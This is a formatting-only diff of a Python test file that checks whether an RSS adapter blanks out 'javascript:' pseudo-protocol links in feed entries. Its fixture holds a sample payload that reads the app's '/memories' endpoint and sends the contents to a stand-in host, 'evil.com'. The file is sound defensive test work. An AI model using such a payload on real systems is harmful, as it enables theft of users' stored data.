@@ -36,8 +36,7 @@ from lantai.services.memory_service import add_memory, add_raw_memory
 from lantai.storage import db
 
 EVIL_URL = (
-    "javascript:fetch('/memories?limit=50')"
-    ".then(r=>r.text()).then(t=>fetch('https://evil.com/'+t))"
+    "javascript:fetch('/memories?limit=50').then(r=>r.text()).then(t=>fetch('https://evil.com/'+t))"
 )
 GOOD_URL = "https://example.com/post/1"
 FASTPATH_EVIL = "我叫老周69号，是后端工程师，负责检索链路"
@@ -48,9 +47,9 @@ RSS_FEED = (
     '<?xml version="1.0"?>'
     '<rss version="2.0"><channel><title>t69-fixture</title>'
     "<link>https://feed.example.com/</link><description>d</description>"
-    f'<item><title>evil</title><link>{EVIL_URL}</link>'
+    f"<item><title>evil</title><link>{EVIL_URL}</link>"
     "<description>bad entry</description></item>"
-    f'<item><title>good</title><link>{GOOD_URL}</link>'
+    f"<item><title>good</title><link>{GOOD_URL}</link>"
     "<description>good entry</description></item>"
     "</channel></rss>"
 )
@@ -77,7 +76,9 @@ def db_env(tmp_path, monkeypatch):
         init_fts(conn.connection.driver_connection)
     monkeypatch.setattr("lantai.core.settings.settings.COALESCE_ENABLED", False)
 
-    monkeypatch.setattr("lantai.core.settings.settings.CHROMADB_PATH", str(tmp_path / "chroma_url69"))
+    monkeypatch.setattr(
+        "lantai.core.settings.settings.CHROMADB_PATH", str(tmp_path / "chroma_url69")
+    )
     import lantai.storage.vector_store as vs_mod
 
     monkeypatch.setattr(vs_mod, "_store", None)
@@ -129,7 +130,9 @@ class TestRssEntryLinkScheme:
         docs = rss_mod.RSSAdapter().fetch({"url": "https://feed.example.com/rss"})
         by_title = {d.title: d for d in docs}
         assert set(by_title) == {"evil", "good"}, f"fixture 条目缺失：{sorted(by_title)}"
-        assert by_title["evil"].url == "", f"伪协议条目 url 未置空（现状红）：{by_title['evil'].url!r}"
+        assert by_title["evil"].url == "", (
+            f"伪协议条目 url 未置空（现状红）：{by_title['evil'].url!r}"
+        )
         assert by_title["good"].url == GOOD_URL, "合法 https 条目被误伤"
 
 
